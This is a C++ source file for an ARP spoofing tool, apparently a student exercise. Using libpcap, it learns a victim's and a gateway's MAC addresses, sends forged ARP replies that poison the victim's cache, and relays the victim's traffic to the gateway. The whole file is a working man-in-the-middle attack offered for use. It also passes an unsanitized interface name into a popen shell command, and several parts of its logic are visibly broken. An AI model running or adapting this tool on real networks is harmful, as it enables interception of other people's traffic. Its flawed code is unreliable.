#include <iostream>
#include <cstring>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

using namespace std;

// static is better than #define
static const int ETHERTYPE_ARP = 0x0806;
static const int ETHERTYPE_IP = 0x0800;
static const int ARPOP_REQUEST = 1;
static const int ARPOP_REPLY = 2;

struct ether_hdr {
    uint8_t h_dest[6];	    /* destination eth addr	*/
    uint8_t h_source[6];	/* source ether addr	*/
    uint16_t h_proto;       /* packet type ID field	*/
};

struct arp_hdr {
    uint16_t ar_hrd;      	/* Format of hardware address.  */
    uint16_t ar_pro;      	/* Format of protocol address.  */
    uint8_t ar_hln;         /* Length of hardware address.  */
    uint8_t ar_pln;         /* Length of protocol address.  */
    uint16_t ar_op;         /* ARP opcode (command).  */
    uint8_t __ar_sha[6];	/* Sender hardware address.  */
    uint8_t __ar_sip[4];    /* Sender IP address.  */
    uint8_t __ar_tha[6];	/* Target hardware address.  */
    uint8_t __ar_tip[4];    /* Target IP address.  */
};

struct ether_arp_hdr {
    ether_hdr eth;
    arp_hdr arph;
};

struct ether_ip_hdr {
    ether_hdr eth;
    iphdr iph;
};

void usage() {
    cout << "syntax: arp_spoof <interface> <sender ip> <target ip>" << endl;
    cout << "sample: arp_spoof wlan0 192.168.10.2 192.168.10.1" << endl;
}

int get_myinterface(char *dev, char my_mac[6]) {

    int tohex, i = 0;
    FILE* fp;
    char cmd[300] = {0x0};
    char mac[18] = {0x0};

    sprintf(cmd, "ifconfig %s | grep HWaddr | awk '{print $5}'", dev);
    fp = popen(cmd, "r");
    fgets(mac, sizeof(mac), fp);
    pclose(fp);

    char *ptr = strtok(mac, ":");
    while(ptr != NULL) {
        tohex = strtol(ptr, NULL, 16);
        my_mac[i] = tohex;
        i++;
        ptr = strtok(NULL, ":");
    }
    return 0;
}

// struct ether_arp_hdr *etharph = (struct hdr_tosend*)malloc(sizeof(struct ether_arp_hdr));
struct ether_arp_hdr *etharph;
struct ether_ip_hdr *ethiph;
int send_arp_requestpacket(pcap_t* handle, char mac[6], char sip[4], char tip[4]) {

    etharph = (struct ether_arp_hdr*)malloc(sizeof(struct ether_arp_hdr));

    memset(etharph->eth.h_dest, 0xff, 6);
    memcpy(etharph->eth.h_source, mac, 6);
    etharph->eth.h_proto = htons(ETHERTYPE_ARP);

    etharph->arph.ar_hrd = htons(0x0001);
    etharph->arph.ar_pro = htons(0x0800);
    etharph->arph.ar_hln = 0x06;
    etharph->arph.ar_pln = 0x04;
    etharph->arph.ar_op = htons(0x0001);

    memcpy(etharph->arph.__ar_sha, mac, 6);
    memcpy(etharph->arph.__ar_sip, sip, 4);
    memset(etharph->arph.__ar_tha, 0x00, 6);
    memcpy(etharph->arph.__ar_tip, tip, 4);

    if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
           cout << "Error send arp request packet: \n" << pcap_geterr(handle) << endl;
           return -1;
    } else cout << "Send arp request packet" << endl;
    return 0;
}

int arp_infection_packet(pcap_t* handle, char mac[6], char victimip[4], char victim_mac[6], char targetip[4]) {

    // Sender : Attacker mac address
    memcpy(etharph->arph.__ar_sha, mac, 6);
    memcpy(etharph->eth.h_source, mac, 6);
    memcpy(etharph->arph.__ar_sip, victimip, 4);

    // Target
    memcpy(etharph->eth.h_dest, victim_mac, 6);
    memcpy(etharph->arph.__ar_tha, victim_mac, 6);
    memcpy(etharph->arph.__ar_tip, targetip, 4);

    etharph->eth.h_proto = htons(ETHERTYPE_ARP);
    etharph->arph.ar_hrd = htons(0x0001);
    etharph->arph.ar_pro = htons(0x0800);
    etharph->arph.ar_hln = 0x06;
    etharph->arph.ar_pln = 0x04;
    etharph->arph.ar_op = htons(0x0002);

    if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
           cout << "Error send arp infection packet: \n" << pcap_geterr(handle) << endl;
           return -1;
    } else cout << "Send arp infection packet" << endl;
    return 0;
}

int ip_relay_pacekt(pcap_t* handle, char victim_mac[6], char gateway_mac[6]) {

    memcpy(ethiph->eth.h_dest, gateway_mac, 6);
    memcpy(ethiph->eth.h_source, victim_mac, 6);

    if (pcap_sendpacket(handle, (const u_char*)ethiph, 42) != 0) {
           cout << "Error send IP relay packet: \n" << pcap_geterr(handle) << endl;
           return -1;
    } else cout << "Send IP relay packet" << endl;
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 4) {
        usage();
        return -1;
    }

    // Variable declaration
    char mac[6];
    char *dev = argv[1];
    char *victim_ip = argv[2];
    char *target_ip = argv[3]; // = Gateway
    char victim_mac[6];
    char gateway_mac[6];
    char errbuf[PCAP_ERRBUF_SIZE];

    int res;
    int onetime = 0;
    const u_char* packet;
    struct pcap_pkthdr* header;

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    // GOOD
    inet_pton(AF_INET, victim_ip, victim_ip);
    inet_pton(AF_INET, target_ip, target_ip);

    get_myinterface(dev, mac);
    send_arp_requestpacket(handle, mac, target_ip, victim_ip);

    while(res = pcap_next_ex(handle, &header, &packet)) { // get captured packet data

        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        etharph = (ether_arp_hdr*)packet;
        ethiph = (ether_ip_hdr*)packet;

        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == ARPOP_REPLY
                && (memcmp(etharph->eth.h_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6)==0)
                && (memcmp(etharph->eth.h_source, mac, 6)==0)) {

            if(onetime == 0) { // Get victim mac
                memcpy(victim_mac, etharph->eth.h_source, 6);
                cout << "\t\tGet victim mac" << endl;

                send_arp_requestpacket(handle, mac, victim_ip, target_ip);
                memcpy(gateway_mac, etharph->eth.h_source, 6);
                cout << "\t\tGet gateway mac" << endl;
                onetime = 1;
            }
            arp_infection_packet(handle, mac, victim_ip, victim_mac, target_ip);

        } else if(ethiph->eth.h_proto == htons(ETHERTYPE_IP)
                  && (memcmp(ethiph->eth.h_dest, mac, 6)==0)
                  && (memcmp(ethiph->eth.h_source, victim_mac, 6)==0)) {
            ip_relay_pacekt(handle, victim_mac, gateway_mac);
        }
    }
    pcap_close(handle);
}

